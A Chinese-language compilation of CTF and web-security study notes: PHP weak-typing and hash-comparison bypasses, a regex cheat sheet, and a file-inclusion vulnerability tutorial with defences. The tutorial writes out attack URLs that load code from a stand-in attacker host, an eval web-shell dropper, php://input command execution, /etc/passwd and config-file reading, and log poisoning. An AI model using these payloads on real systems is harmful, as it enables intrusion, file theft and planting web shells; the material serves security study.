bool类型的true跟任意字符串可以弱类型相等的，当代码中存在unserialize或者json_decode的时候，我们可以构造bool类型，来达到欺骗。

<!-- $test=$_GET['username']; $test=md5($test); if($test=='0') -->

我们可以知道php弱类型中以0e开头的可以满足==0，$test是通过md5加密的，百度一下0e开头的md5哈希字符串，如下：

QNKCDZO(0e830400451993494058024219903391)
s878926199a(0e545993274517709034328855841020)

s155964671a(0e342768416822451524974117254469)

s214587387a(0e848240448830537924465865611904) 


== :　 比较运算符号  不会检查条件式的表达式的类型

===:  恒等计算符 , 同时检查表达式的值与类型。（会检查表达式类型，如bool）

 

PHP序列化与反序列化
serialize（） 对输入的数据进行序列化转换
unserialize() 恢复原先变量，还原已经序列化的对象。

关于php序列化与反序列化，可以参考： http://www.111cn.net/phper/php-cy/62969.htm 

intval()：变量转成整数类型

　　如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。

　　如果字符串第一个是‘-'，则从第二个开始算起。 
　　如果参数是浮点数，则返回他取整之后的值。 
　　当然intval()返回的值在一个4字节所能表示的范围之内（-2147483648~2147483647），对于超过这个范围的值将用边界值代替。 

* 当php进行一些数学计算的时候，当有一个对比参数是整数的时候,会把另外一个参数强制转换为整数。

1 var_dump(0 == '0'); // true
2 var_dump(0 == 'abcdefg'); // true 
3 var_dump(0 === 'abcdefg'); // false
4 var_dump(1 == '1abcdef'); // true

* bool类型的true跟任意字符串可以弱类型相等



- Load url ( Alt + A )
- Split url ( Alt + S )
- Execute ( Alt + X, Ctrl + Enter )
- INT -1 ( Alt - )
- INT +1 ( Alt + )
- HEX -1 ( Ctrl Alt - )
- HEX +1 ( Ctrl + Alt + )
- MD5 Hash ( Alt + M )
- MySQL CHAR() ( Alt + Y )
- MS SQL Server CHAR() ( Alt + Q )



正则表达式（Regular Expression，在代码中常简写为regex、regexp或RE）是计算机科学的一个概念。正则表达式使用单个字符串来描述、匹配一系列符合某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些符合某个模式的文本。许多程序设计语言都支持利用正则表达式进行字符串操作。在很多文本编辑器里，正则表达式通常被用来检索、替换那些符合某个模式的文本。

　　正则表达式用于字符串处理、表单验证等场合，实用高效。现将一些常用的表达式收集于此，以备不时之需。

　　匹配中文字符的正则表达式： [\u4e00-\u9fa5]
　　评注：匹配中文还真是个头疼的事，有了这个表达式就好办了

　　匹配双字节字符(包括汉字在内)：[^\x00-\xff]
　　评注：可以用来计算字符串的长度（一个双字节字符长度计2，ASCII字符计1）

　　匹配空白行的正则表达式：\n\s*\r
　　评注：可以用来删除空白行

　　匹配HTML标记的正则表达式：<(\S*?)[^>]*>.*?</\1>|<.*? />
　　评注：网上流传的版本太糟糕，上面这个也仅仅能匹配部分，对于复杂的嵌套标记依旧无能为力

　　匹配首尾空白字符的正则表达式：^\s*|\s*$
　　评注：可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式

　　匹配Email地址的正则表达式：\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*
　　评注：表单验证时很实用

　　匹配网址URL的正则表达式：[a-zA-z]+://[^\s]*
　　评注：网上流传的版本功能很有限，上面这个基本可以满足需求

　　匹配帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$
　　评注：表单验证时很实用

　　匹配国内电话号码：\d{3}-\d{8}|\d{4}-\d{7}
　　评注：匹配形式如 0511-4405222 或 021-87888822

　　匹配腾讯QQ号：[1-9][0-9]{4,}
　　评注：腾讯QQ号从10000开始

　　匹配中国邮政编码：[1-9]\d{5}(?!\d)
　　评注：中国邮政编码为6位数字

　　匹配身份证：\d{15}|\d{18}
　　评注：中国的身份证为15位或18位

　　匹配ip地址：\d+\.\d+\.\d+\.\d+
　　评注：提取ip地址时有用

　　匹配特定数字：
　　^[1-9]\d*$　 　 //匹配正整数
　　^-[1-9]\d*$ 　 //匹配负整数
　　^-?[1-9]\d*$　　 //匹配整数
　　^[1-9]\d*|0$　 //匹配非负整数（正整数 + 0）
　　^-[1-9]\d*|0$　　 //匹配非正整数（负整数 + 0）
　　^[1-9]\d*\.\d*|0\.\d*[1-9]\d*$　　 //匹配正浮点数
　　^-([1-9]\d*\.\d*|0\.\d*[1-9]\d*)$　 //匹配负浮点数
　　^-?([1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0)$　 //匹配浮点数
　　^[1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0$　　 //匹配非负浮点数（正浮点数 + 0）
　　^(-([1-9]\d*\.\d*|0\.\d*[1-9]\d*))|0?\.0+|0$　　//匹配非正浮点数（负浮点数 + 0）
　　评注：处理大量数据时有用，具体应用时注意修正

　　匹配特定字符串：
　　^[A-Za-z]+$　　//匹配由26个英文字母组成的字符串
　　^[A-Z]+$　　//匹配由26个英文字母的大写组成的字符串
　　^[a-z]+$　　//匹配由26个英文字母的小写组成的字符串
　　^[A-Za-z0-9]+$　　//匹配由数字和26个英文字母组成的字符串
　　^\w+$　　//匹配由数字、26个英文字母或者下划线组成的字符串
　　评注：最基本也是最常用的一些表达式


文件包含漏洞
定义：在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，导致意外的文件泄露甚至恶意的代码注入。

程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无须再次编写，这种调用文件的过程一般被称为包含。
程序开发人员都希望代码更加灵活，所以通常会将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。
文件包含漏洞在PHP Web Application中居多，而在JSP,ASP,ASP.NET程序中却非常少，甚至没有包含漏洞的存在。
PHP常见的导致文件包含的函数如下：include(),include_once(),require(),require_once(),fopen(),readfile()
当使用前4个函数包含一个新的文件时，只要文件内容符合PHP语法规范，那么任何扩展名都可以被PHP解析。包含非PHP语法规范源文件时，将会暴露其源代码。

后2个函数会造成敏感文件被读取。

要想成功利用文件包含漏洞，需要满足下面两个条件：
1.include()等函数通过动态变量的方式引入需要包含的文件。
2.用户能够控制该动态变量

一、本地文件包含
[php] view plain copy

    <?php  
    $file = $_GET['file'];  
    if (file_exists('/home/wwwrun'.$file.'.php'))  
    {  
        include '/home/wwwrun'.$file.'.php';  
    }  
    ?>  


假如用户控制$file的值为“../../etc/passwd”，那么这段代码相当于include '/home/wwwrun/../../etc/passwd.php'，而这个文件显然是不存在的。
需要用到字符串截断技巧：PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，0字节（\x00）将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串，即：../../etc/passwd\0，通过Web输入时，只需要UrlEncode，变成../../etc/passwd%00
“../../../”的方式又被称为“目录遍历”。可以通过配置PHP的open_basedir来限制，其作用是限制在某个特定目录下PHP能打开的文件。例如open_basedir = D:\soft\develop\env\\sites\www.a.com\,在windows下多个目录应当用分号隔开，在Linux下则用冒号隔开。

要解决文件包含漏洞，一种方式是使用枚举即一种白名单的方式。

二、远程文件包含
如果PHP的配置选项allow_url_include为ON的话，则include/require函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞。
[php] view plain copy

    require_once $basePath . '/action/m_share.php'  

攻击者可以构造如下的攻击URL /?param=http://attacker/phpshell.txt?
最终加载的代码实际上执行了 require_once 'http://attacker/phpshell.txt?/action/m_share.php'
问号后面的代码被解释成URL的querystring，也是一种“截断”，这是在利用远程文件包含漏洞时的常见技巧。同样的，%00也可以用做截断符号。

三、本地文件包含的利用技巧
1.读取敏感文件
访问URL：http://www.xxser.com/index.php?page=/etc/passwd
如果目标主机文件存在，并且有相应的权限，那么就可以读出文件的内容。反之，就会得到一个类似于;open_basedir restriction in effect的警告。
2.远程包含Shell
如果目标主机allow_url_fopen选项是激活的，就可以尝试远程包含一句话木马，如：http://www.attacker.com/echo.txt，代码如下：
<?php fputs(fopen("shell.php","w"),"<?php eval(\$_POST[xxser]);?>");?>
访问：http://www.example.com/index.php?page=http://www.attacker.com/echo.txt。将会在index.php所在的目录下生成shell.php，内容为：
<?php eval($_POST[xxser]);?>
3.本地包含配合文件上传
假设已经上传一句话图片木马到服务器，路径为：/uploadfile/xxx.jpg
图片代码如下：<?php fputs(fopen("shell.php","w"),"<?php eval(\$_POST[xxser]);?>");?>
访问URL：http://www.example.com/index.php?page=./uploadfile/xxx.jpg，包含这张图片，将会在index.php所在的目录下生成shell.php。
4.使用PHP封装协议
4.1 使用封装协议读取PHP文件
例子如下：http://www.example.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php
访问URL，得到经过Base64加密后的字符串，这段代码就是Base64加密过后的PHP源代码，解密后就可得到原本的“样貌”。
4.2 写入PHP文件
在allow_url_include为On时，构造URL：http://www.example.com/index.php?page=php://input，并且提交数据为：<?php system('net user');?>
会得到net user命令的结果。
5.包含Apache日志文件
本地文件包含的利用。
Apache有两个日志文件：access.log（访问日志）和error.log（错误日志）。
攻击者先访问http://www.example.com/<?php phpinfo();?>,操作这一步时，需要Burp，否则<,>,空格都会被转码。
随后访问http://www.xxser.com/index.php?page=./../Apache-20/logs/access.log
使用这种方式时，找到Apache的路径是关键。
6.截断包含
<?php
if(isset($_GET['page'])){
include $_GET['page'].".php";
}else{
include 'home.php';
}
?>
如果此时存在一个图片木马，名为1.jpg，可以输入如下URL：http://www.example.com/index.php?page=1.jpg%00
当然这种方法只适用于magic_quotes_gpc=Off的情况下。
7.绕过WAF防火墙
图片木马一般不会被web杀毒软件查出来。

四、防御方法
1.严格判断包含的参数是否外部可控，因为文件包含漏洞利用成功与否的关键点就在于被包含的文件是否可被外部控制；
2.路径限制：限制被包含的文件只能在某一文件夹内，一定要禁止目录跳转字符，如：“../”；
3.包含文件验证：验证被包含的文件是否是白名单中的一员；
4.尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include("head.php");。

后记

include和require语句是相同的，除了错误处理方面：
reuqire会生成致命错误（E_COMPILE_ERROR）并停止脚本
include只生成错误报告（E_WARING），并且脚本会继续
require和require_once的差别是，require重复调用会多次加载你引用的文件，而require_once只加载一次，而不管你实际上调用了多少次，主要用于复杂的文件包含关系。
include和include_once的差别也可以以此类推。


JSP包含分两种方式：静态包含和动态包含。
一、静态包含
<%@include file="page.txt"%>为JSP的静态包含语句，静态包含语句先进行包含，再做处理操作。
JSP语法规定，include指令为静态包含，只允许包含一个已经存在于服务器中的文件，而不能使用变量来控制包含某个文件，这就意味着使用include指令将不存在文件包含漏洞。
二、动态包含
<jsp:inclde page="page.txt"/>为动态包含语句，在运行时会先处理被包含页面，然后再包含，而且可以包含一个动态页面（变量）。
但在包含一个非JSP文件扩展名时，即使其内容符合JSP语法规范，也会只读取其源代码，而不会解析其JSP代码。


 50 4E
strcmp(va,flag)==1(区分大小写) 漏洞 va[]=1

php sha1 绕过  构建数组，因为sha1无法判断，然后继续执行  passwprd[]=1&&username[]=2


黑魔法,是以前做CTF时遇到并记录的,很适合在做CTF代码审计的时候翻翻看看.一、要求变量原值不同但md5或sha1相同的情...

CTF之PHP黑魔法总结

黑魔法，是以前做CTF时遇到并记录的，很适合在做CTF代码审计的时候翻翻看看。

一、要求变量原值不同但md5或sha1相同的情况下

1.0e开头的全部相等（==判断）

240610708 和 QNKCDZO md5值类型相似，但并不相同，在”==”相等操作符的运算下，结果返回了true.

Md5和sha1一样

<?

$password=$_GET['password'];

if(strcmp('am0s',$password)){

    echo 'false!';

}else{

    echo 'success!';

}

?>

2.利用数组绕过（===判断）

Md5和sha1对一个数组进行加密将返回NULL；而NULL===NULL返回true，所以可绕过判断。

二、Strcmp利用数组绕过

查看的手册

int strcmp ( string $str1 , string $str2 )

Return Values

Returns < 0 if str1 is less than str2; > 0 if str1 is greater than str2, and 0 if they are equal.

当输入的两个值为不是字符串时就会产生不预期的返回值：

比如

这样一段代码中，输入password[]=1则返回success，成功绕过验证

三、当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过

$a=$_GET['a'];

$b=$_GET['b'];

$c=is_numeric($a) and is_numeric($b);

var_dump(is_numeric($a));

var_dump(is_numeric($b));

var_dump($c);  //$b可以不是数字，同样返回true

$test=false and true;

var_dump($test); //返回true

四、NULL,0,”0″,array()使用==和false比较时，都是会返回true的

五、Eregi匹配

    数组绕过

ereg是处理字符串，传入数组之后，ereg是返回NULL

    %00截断绕过

Http://www.secbox.cn/hacker/1889.HTML

六、接收参数$a得存在，并且$a==0可用.绕过（非数字都可绕过）

测试代码：

<?

$a=$_GET['a'];

if ($a==0) {

echo "1";

}

if ($a) {

echo "must";

}

七、接收参数中不能出现某一字符，但下面又必须使用可以://伪协议绕过

目前遇到的是file_get_contents其他情况具体而定

八、is_numeric绕过

空格、\t、\n、\r、\v、\f、+、-能够出现在参数开头，“点”能够在参数任何位置，E、e只能出现在参数中间。

九、5,3,29,这里可以直接用%0b绕过\s（空白字符）的匹配

十、既是0又是1的情况

$a==1&$test[$a]=t时

    精度（16以上）var_dump(9999999999999999999==1);//true

    科学计数法 .1e1 echo $b[‘.1e1’]//输出t

.是字符串所以在数组里面变成0，但在is_numeric中有点则正常输出为数字

十一、当switch没有break时可以继续往下执行

<?

if (isset ( $_GET ['which'] )) {

$which = $_GET ['which'];

switch ($which) {

case 0 :

case 1 :

case 2 :

echo $which . '.';

break;

default :

echo "1";

break;

}

}

$which进入循环时没有break则按顺序
